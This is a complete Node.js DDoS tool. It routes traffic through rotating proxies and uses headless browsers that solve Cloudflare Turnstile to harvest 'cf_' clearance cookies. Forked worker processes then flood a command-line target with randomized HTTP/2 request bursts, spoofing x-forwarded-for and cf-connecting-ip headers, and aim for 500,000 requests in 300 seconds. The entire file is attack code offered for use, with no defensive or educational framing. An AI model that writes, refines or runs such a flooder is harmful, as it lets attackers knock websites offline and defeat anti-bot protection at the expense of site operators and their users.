const { connect } = require("puppeteer-real-browser");
const http2 = require("http2");
const tls = require("tls");
const net = require("net");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");

// ENHANCED CONFIGURATION
const TARGET_RPS = 1667; // 500,000 / 300 detik
const WORKER_MULTIPLIER = 10;
const REQUEST_BURST = 100;
const CONNECTION_POOL = 50;

// Advanced Color System
const COLORS = {
  reset: "\x1b[0m",
  cyan: "\x1b[36m",
  green: "\x1b[32m",
  red: "\x1b[31m",
  yellow: "\x1b[33m",
  magenta: "\x1b[35m",
  blue: "\x1b[34m",
  white: "\x1b[37m",
  bold: "\x1b[1m",
  blink: "\x1b[5m"
};

// Advanced Header System
const printHeader = () => {
  console.clear();
  console.log(`${COLORS.magenta}${COLORS.bold}
  ██████╗ ██╗   ██╗██████╗ ██████╗ ███████╗██████╗ 
  ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
  ██████╔╝ ╚████╔╝ ██████╔╝██████╔╝█████╗  ██████╔╝
  ██╔═══╝   ╚██╔╝  ██╔═══╝ ██╔══██╗██╔══╝  ██╔══██╗
  ██║        ██║   ██║     ██║  ██║███████╗██║  ██║
  ╚═╝        ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
  ${COLORS.reset}`);
  console.log(`${COLORS.cyan}${COLORS.bold}[m85.68 ULTRA] 500K/300s CAPTCHA ANNIHILATOR${COLORS.reset}\n`);
};

// HYPER-PARALLEL PROXY LOADER
function loadProxies(proxyFile) {
  try {
    const proxyData = fs.readFileSync(proxyFile, 'utf8').trim();
    const proxyList = proxyData.split('\n')
      .map(line => line.trim())
      .filter(line => line.length > 0 && !line.startsWith('#'));
    
    if (proxyList.length === 0) throw new Error("Empty proxy file");
    
    // Group proxies by type for load balancing
    const proxyGroups = {
      http: [],
      socks4: [],
      socks5: [],
      premium: []
    };
    
    proxyList.forEach(proxy => {
      if (proxy.includes('|')) {
        const [ipPort, type] = proxy.split('|');
        if (type.includes('elite')) proxyGroups.premium.push(ipPort);
        else if (type.includes('socks5')) proxyGroups.socks5.push(ipPort);
        else if (type.includes('socks4')) proxyGroups.socks4.push(ipPort);
        else proxyGroups.http.push(ipPort);
      } else {
        proxyGroups.http.push(proxy);
      }
    });
    
    console.log(`${COLORS.green}✓ Loaded ${proxyList.length} proxies (HTTP:${proxyGroups.http.length} SOCKS5:${proxyGroups.socks5.length} Premium:${proxyGroups.premium.length})${COLORS.reset}`);
    return proxyGroups;
  } catch (err) {
    console.log(`${COLORS.red}✗ Proxy Error: ${err.message}${COLORS.reset}`);
    return { http: [], socks4: [], socks5: [], premium: [] };
  }
}

// MASSIVE CONNECTION POOL MANAGER
class ConnectionManager {
  constructor(target, proxyGroups) {
    this.target = new URL(target);
    this.proxyGroups = proxyGroups;
    this.connectionPool = [];
    this.activeConnections = 0;
    this.maxConnections = CONNECTION_POOL;
    this.connectionQueue = [];
  }

  async createConnection() {
    const proxy = this.getOptimalProxy();
    if (!proxy) return null;

    return new Promise((resolve) => {
      const socket = net.connect({
        host: proxy.host,
        port: proxy.port,
        timeout: 5000
      });

      socket.on('connect', () => {
        const connectRequest = `CONNECT ${this.target.hostname}:443 HTTP/1.1\r\n` +
                              `Host: ${this.target.hostname}\r\n` +
                              `Proxy-Connection: Keep-Alive\r\n\r\n`;

        socket.write(connectRequest);
        
        let buffer = '';
        socket.on('data', (data) => {
          buffer += data.toString();
          if (buffer.includes('\r\n\r\n')) {
            if (buffer.includes('200')) {
              const tlsSocket = tls.connect({
                socket: socket,
                servername: this.target.hostname,
                minVersion: 'TLSv1.3',
                ALPNProtocols: ['h2'],
                ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256',
                secureOptions: crypto.constants.SSL_OP_NO_TLSv1_2,
                rejectUnauthorized: false
              });

              tlsSocket.on('secureConnect', () => {
                const client = http2.connect(this.target.origin, {
                  createConnection: () => tlsSocket,
                  settings: {
                    headerTableSize: 65536,
                    enablePush: false,
                    initialWindowSize: 6291456,
                    maxConcurrentStreams: 10000
                  }
                });

                client.on('error', () => {});
                this.connectionPool.push({ client, tlsSocket, proxy });
                this.activeConnections++;
                resolve({ client, tlsSocket, proxy });
              });

              tlsSocket.on('error', () => {
                socket.destroy();
                resolve(null);
              });
            } else {
              socket.destroy();
              resolve(null);
            }
          }
        });
      });

      socket.on('error', () => resolve(null));
      socket.on('timeout', () => {
        socket.destroy();
        resolve(null);
      });
    });
  }

  getOptimalProxy() {
    // Priority: premium > socks5 > http
    const sources = [
      this.proxyGroups.premium,
      this.proxyGroups.socks5,
      this.proxyGroups.http,
      this.proxyGroups.socks4
    ];

    for (const source of sources) {
      if (source.length > 0) {
        const proxyStr = source[Math.floor(Math.random() * source.length)];
        const [host, port] = proxyStr.split(':');
        return { host, port: parseInt(port) };
      }
    }
    return null;
  }

  async warmupPool(count) {
    console.log(`${COLORS.blue}⚡ Warming up ${count} connections...${COLORS.reset}`);
    
    const promises = [];
    for (let i = 0; i < count; i++) {
      promises.push(this.createConnection());
    }
    
    await Promise.all(promises);
    console.log(`${COLORS.green}✓ Pool ready: ${this.connectionPool.length} active connections${COLORS.reset}`);
  }

  getConnection() {
    if (this.connectionPool.length === 0) {
      return this.createConnection();
    }
    return this.connectionPool.pop();
  }

  releaseConnection(conn) {
    if (conn && conn.client && !conn.client.destroyed) {
      this.connectionPool.push(conn);
    }
  }
}

// ULTRA-FAST REQUEST ENGINE
class RequestEngine {
  constructor(connectionManager, bypassData) {
    this.cm = connectionManager;
    this.bypassData = bypassData;
    this.requestCount = 0;
    this.successCount = 0;
    this.startTime = Date.now();
    
    // Request templates
    this.paths = ['/', '/api', '/graphql', '/wp-admin', '/v1/auth', '/rest/v2'];
    this.methods = ['GET', 'POST', 'OPTIONS', 'PUT'];
    
    // Performance tracking
    setInterval(() => this.showStats(), 5000);
  }

  generateHeaders(bypassSession) {
    const chromeVersion = Math.floor(Math.random() * 30) + 90;
    const sessionId = crypto.randomBytes(16).toString('hex');
    
    return {
      ':method': this.methods[Math.floor(Math.random() * this.methods.length)],
      ':path': `${this.paths[Math.floor(Math.random() * this.paths.length)]}?v=${sessionId}&_=${Date.now()}`,
      ':authority': this.cm.target.hostname,
      ':scheme': 'https',
      'user-agent': bypassSession.userAgent || `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion}.0.0.0 Safari/537.36`,
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
      'accept-language': 'en-US,en;q=0.9',
      'accept-encoding': 'gzip, deflate, br, zstd',
      'cache-control': 'no-cache',
      'pragma': 'no-cache',
      'sec-ch-ua': `"Chromium";v="${chromeVersion}", "Google Chrome";v="${chromeVersion}", "Not=A?Brand";v="24"`,
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'none',
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': '1',
      'cookie': bypassSession.cookies.map(c => `${c.name}=${c.value}`).join('; '),
      'x-forwarded-for': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
      'cf-connecting-ip': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
      'x-request-id': crypto.randomBytes(8).toString('hex'),
      'priority': 'u=1, i'
    };
  }

  async sendRequestBurst(count = REQUEST_BURST) {
    const session = this.bypassData[Math.floor(Math.random() * this.bypassData.length)];
    const conn = await this.cm.getConnection();
    
    if (!conn || !conn.client) return;

    try {
      for (let i = 0; i < count; i++) {
        const headers = this.generateHeaders(session);
        const request = conn.client.request(headers, {
          weight: Math.floor(Math.random() * 256) + 1,
          exclusive: false
        });

        request.on('response', (headers) => {
          const status = headers[':status'];
          this.requestCount++;
          if (status === 200 || status === 201 || status === 202) {
            this.successCount++;
          }
        });

        request.on('error', () => {});
        request.end();

        // Non-blocking delay for burst control
        if (i % 10 === 0) {
          await new Promise(resolve => setImmediate(resolve));
        }
      }
    } catch (err) {
      // Silent fail
    } finally {
      this.cm.releaseConnection(conn);
    }
  }

  showStats() {
    const elapsed = (Date.now() - this.startTime) / 1000;
    const rps = this.requestCount / elapsed;
    const successRate = this.requestCount > 0 ? (this.successCount / this.requestCount * 100).toFixed(2) : 0;
    
    console.log(`${COLORS.yellow}📊 STATS | Requests: ${this.requestCount.toLocaleString()} | RPS: ${rps.toFixed(0)} | Success: ${successRate}% | Connections: ${this.cm.activeConnections}${COLORS.reset}`);
    
    if (elapsed >= 300) {
      console.log(`${COLORS.green}🎯 TARGET ACHIEVED: ${this.requestCount.toLocaleString()} requests in ${elapsed.toFixed(1)}s${COLORS.reset}`);
      process.exit(0);
    }
  }
}

// MASSIVE BYPASS HARVESTER
async function harvestBypassSessions(target, proxyGroups, count = 100) {
  console.log(`${COLORS.magenta}🌐 Harvesting ${count} bypass sessions...${COLORS.reset}`);
  
  const sessions = [];
  const batchSize = 20;
  
  for (let i = 0; i < count; i += batchSize) {
    const currentBatch = Math.min(batchSize, count - i);
    const batchPromises = [];
    
    for (let j = 0; j < currentBatch; j++) {
      batchPromises.push(harvestSingleSession(target, proxyGroups));
    }
    
    const results = await Promise.allSettled(batchPromises);
    results.forEach(result => {
      if (result.status === 'fulfilled' && result.value) {
        sessions.push(result.value);
      }
    });
    
    console.log(`${COLORS.blue}✅ Harvested ${sessions.length}/${count} sessions${COLORS.reset}`);
    
    if (sessions.length >= count * 0.8) {
      console.log(`${COLORS.green}✓ Sufficient sessions obtained (${sessions.length})${COLORS.reset}`);
      break;
    }
    
    // Delay between batches
    await new Promise(resolve => setTimeout(resolve, 2000));
  }
  
  return sessions;
}

async function harvestSingleSession(target, proxyGroups) {
  const proxy = getRandomProxy(proxyGroups);
  if (!proxy) return null;

  try {
    const browser = await connect({
      headless: 'new',
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-accelerated-2d-canvas',
        '--disable-gpu',
        `--proxy-server=http://${proxy.host}:${proxy.port}`
      ],
      turnstile: true
    });

    const page = await browser.page;
    await page.goto(target, { waitUntil: 'networkidle0', timeout: 30000 });
    
    // Wait for Cloudflare challenge
    await page.waitForTimeout(8000);
    
    const cookies = await page.cookies();
    const userAgent = await page.evaluate(() => navigator.userAgent);
    
    await browser.browser.close();
    
    return {
      cookies: cookies.filter(c => c.name.includes('cf_')),
      userAgent,
      proxy: `${proxy.host}:${proxy.port}`
    };
  } catch (err) {
    return null;
  }
}

function getRandomProxy(proxyGroups) {
  const allProxies = [
    ...proxyGroups.premium,
    ...proxyGroups.socks5,
    ...proxyGroups.http
  ];
  
  if (allProxies.length === 0) return null;
  
  const proxyStr = allProxies[Math.floor(Math.random() * allProxies.length)];
  const [host, port] = proxyStr.split(':');
  return { host, port: parseInt(port) };
}

// HYPER-PARALLEL ATTACK CONTROLLER
async function launchAttack(target, rate, threads, proxyFile) {
  printHeader();
  
  console.log(`${COLORS.cyan}🎯 Target: ${target}`);
  console.log(`⚡ Rate: ${rate} RPS`);
  console.log(`👥 Threads: ${threads}`);
  console.log(`📊 Goal: 500,000 requests in 300s${COLORS.reset}\n`);
  
  // Load proxies
  const proxyGroups = loadProxies(proxyFile);
  
  // Harvest bypass sessions
  const bypassSessions = await harvestBypassSessions(target, proxyGroups, 50);
  
  if (bypassSessions.length === 0) {
    console.log(`${COLORS.red}✗ No bypass sessions obtained${COLORS.reset}`);
    return;
  }
  
  console.log(`${COLORS.green}✓ Starting attack with ${bypassSessions.length} sessions${COLORS.reset}`);
  
  // Create worker clusters
  const numCPUs = os.cpus().length;
  const workers = Math.min(threads, numCPUs * 2);
  
  console.log(`${COLORS.blue}🚀 Launching ${workers} attack workers${COLORS.reset}`);
  
  if (cluster.isPrimary) {
    // Distribute work
    const sessionsPerWorker = Math.ceil(bypassSessions.length / workers);
    
    for (let i = 0; i < workers; i++) {
      const workerSessions = bypassSessions.slice(i * sessionsPerWorker, (i + 1) * sessionsPerWorker);
      const worker = cluster.fork();
      
      worker.send({
        type: 'init',
        target: target,
        proxyGroups: proxyGroups,
        sessions: workerSessions,
        workerId: i
      });
    }
    
    // Monitor progress
    let totalRequests = 0;
    cluster.on('message', (worker, message) => {
      if (message.type === 'stats') {
        totalRequests += message.count;
        
        const elapsed = (Date.now() - global.startTime) / 1000;
        const remaining = 300 - elapsed;
        const neededRPS = Math.max(0, (500000 - totalRequests) / remaining);
        
        console.log(`${COLORS.magenta}📈 TOTAL: ${totalRequests.toLocaleString()} | Needed RPS: ${neededRPS.toFixed(0)} | Time: ${elapsed.toFixed(1)}s${COLORS.reset}`);
      }
    });
    
  } else {
    // Worker process
    process.on('message', async (message) => {
      if (message.type === 'init') {
        global.startTime = Date.now();
        
        const cm = new ConnectionManager(message.target, message.proxyGroups);
        await cm.warmupPool(10);
        
        const engine = new RequestEngine(cm, message.sessions);
        
        // Continuous attack loop
        setInterval(async () => {
          for (let i = 0; i < 10; i++) {
            engine.sendRequestBurst(50);
            await new Promise(resolve => setImmediate(resolve));
          }
        }, 100);
        
        // Report stats
        setInterval(() => {
          process.send({
            type: 'stats',
            count: engine.requestCount
          });
        }, 5000);
      }
    });
  }
}

// MAIN EXECUTION
if (require.main === module) {
  const args = process.argv.slice(2);
  
  if (args.length < 4) {
    console.log(`${COLORS.red}Usage: node ${process.argv[1]} <target> <rate> <threads> <proxyFile>${COLORS.reset}`);
    process.exit(1);
  }
  
  const [target, rate, threads, proxyFile] = args;
  
  // Set aggressive system limits
  require('events').EventEmitter.defaultMaxListeners = 1000;
  process.setMaxListeners(1000);
  
  // Start attack
  launchAttack(
    target,
    parseInt(rate),
    parseInt(threads),
    proxyFile
  ).catch(console.error);
}

module.exports = { launchAttack };